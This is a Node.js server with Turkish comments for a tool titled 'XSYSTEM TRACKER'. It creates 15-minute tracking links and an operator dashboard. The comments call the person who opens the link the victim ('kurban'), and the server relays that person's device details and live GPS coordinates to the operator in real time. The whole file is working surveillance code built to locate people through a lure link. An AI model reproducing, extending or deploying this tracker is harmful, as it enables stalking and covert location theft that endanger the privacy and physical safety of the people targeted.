const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const { createClient } = require('redis');
const { v4: uuidv4 } = require('uuid');
const path = require('path');

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
  cors: { origin: '*' }
});

// ── Redis bağlantısı
const redis = createClient({ url: process.env.REDIS_URL || 'redis://localhost:6379' });
redis.on('error', err => console.log('[REDIS HATA]', err));
(async () => { await redis.connect(); console.log('[REDIS] Bağlantı kuruldu.'); })();

const TTL = 15 * 60; // 15 dakika (saniye cinsinden)

app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// ─────────────────────────────────────────────
// API: Yeni oturum (link) oluştur
// ─────────────────────────────────────────────
app.post('/api/create', async (req, res) => {
  const sessionId = uuidv4().replace(/-/g, '').slice(0, 16);
  const createdAt = Date.now();

  const sessionData = {
    sessionId,
    createdAt,
    expiresAt: createdAt + TTL * 1000,
    visits: 0,
    target: null
  };

  await redis.setEx(`session:${sessionId}`, TTL, JSON.stringify(sessionData));

  console.log(`[+] Yeni oturum oluşturuldu: ${sessionId}`);

  res.json({
    success: true,
    sessionId,
    trackUrl: `/track/${sessionId}`,
    dashUrl: `/dashboard/${sessionId}`,
    expiresIn: TTL
  });
});

// ─────────────────────────────────────────────
// API: Oturum bilgisi sorgula
// ─────────────────────────────────────────────
app.get('/api/session/:id', async (req, res) => {
  const raw = await redis.get(`session:${req.params.id}`);
  if (!raw) return res.status(404).json({ error: 'Oturum bulunamadı veya süresi doldu.' });
  const ttl = await redis.ttl(`session:${req.params.id}`);
  res.json({ ...JSON.parse(raw), ttlRemaining: ttl });
});

// ─────────────────────────────────────────────
// SAYFA: Takip sayfası (kurban açar)
// ─────────────────────────────────────────────
app.get('/track/:id', async (req, res) => {
  const raw = await redis.get(`session:${req.params.id}`);
  if (!raw) return res.sendFile(path.join(__dirname, 'public', 'expired.html'));
  res.sendFile(path.join(__dirname, 'public', 'tracker.html'));
});

// ─────────────────────────────────────────────
// SAYFA: Dashboard (operatör izler)
// ─────────────────────────────────────────────
app.get('/dashboard/:id', async (req, res) => {
  const raw = await redis.get(`session:${req.params.id}`);
  if (!raw) return res.sendFile(path.join(__dirname, 'public', 'expired.html'));
  res.sendFile(path.join(__dirname, 'public', 'dashboard.html'));
});

// ─────────────────────────────────────────────
// ANA SAYFA
// ─────────────────────────────────────────────
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// ─────────────────────────────────────────────
// Socket.io: Gerçek zamanlı veri akışı
// ─────────────────────────────────────────────
io.on('connection', (socket) => {
  console.log(`[WS] Bağlantı: ${socket.id}`);

  // Dashboard bir oturumu izlemeye başlar
  socket.on('watch', async (sessionId) => {
    const raw = await redis.get(`session:${sessionId}`);
    if (!raw) return socket.emit('session_expired');
    socket.join(`room:${sessionId}`);
    socket.emit('session_info', JSON.parse(raw));
    console.log(`[WS] Dashboard ${socket.id} -> oda: ${sessionId}`);
  });

  // Kurban bağlandı
  socket.on('target_connect', async ({ sessionId, deviceInfo }) => {
    const raw = await redis.get(`session:${sessionId}`);
    if (!raw) return socket.emit('session_expired');

    const session = JSON.parse(raw);
    session.visits += 1;
    session.target = {
      ...deviceInfo,
      connectedAt: Date.now(),
      socketId: socket.id
    };

    const ttl = await redis.ttl(`session:${sessionId}`);
    await redis.setEx(`session:${sessionId}`, ttl, JSON.stringify(session));

    socket.join(`room:${sessionId}`);
    socket.data.sessionId = sessionId;
    socket.data.role = 'target';

    // Dashboard'a bildir
    io.to(`room:${sessionId}`).emit('target_arrived', session.target);
    console.log(`[TARGET] Hedef bağlandı → oturum: ${sessionId}`);
  });

  // Konum verisi geldi
  socket.on('location_update', async ({ sessionId, coords }) => {
    const raw = await redis.get(`session:${sessionId}`);
    if (!raw) return;

    const session = JSON.parse(raw);
    if (session.target) {
      session.target.coords = coords;
      session.target.lastSeen = Date.now();
    }

    const ttl = await redis.ttl(`session:${sessionId}`);
    await redis.setEx(`session:${sessionId}`, ttl, JSON.stringify(session));

    // Dashboard'a yansıt
    io.to(`room:${sessionId}`).emit('location_update', coords);
    console.log(`[GPS] ${sessionId} → ${coords.latitude}, ${coords.longitude}`);
  });

  // Konum reddedildi
  socket.on('location_denied', ({ sessionId }) => {
    io.to(`room:${sessionId}`).emit('location_denied');
  });

  socket.on('disconnect', () => {
    console.log(`[WS] Ayrıldı: ${socket.id}`);
    if (socket.data.role === 'target' && socket.data.sessionId) {
      io.to(`room:${socket.data.sessionId}`).emit('target_disconnected');
    }
  });
});

// ─────────────────────────────────────────────
// Sunucu başlat
// ─────────────────────────────────────────────
const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
  console.log(`
╔══════════════════════════════════════╗
║   XSYSTEM TRACKER — SUNUCU AKTİF   ║
║   http://localhost:${PORT}              ║
╚══════════════════════════════════════╝
  `);
});
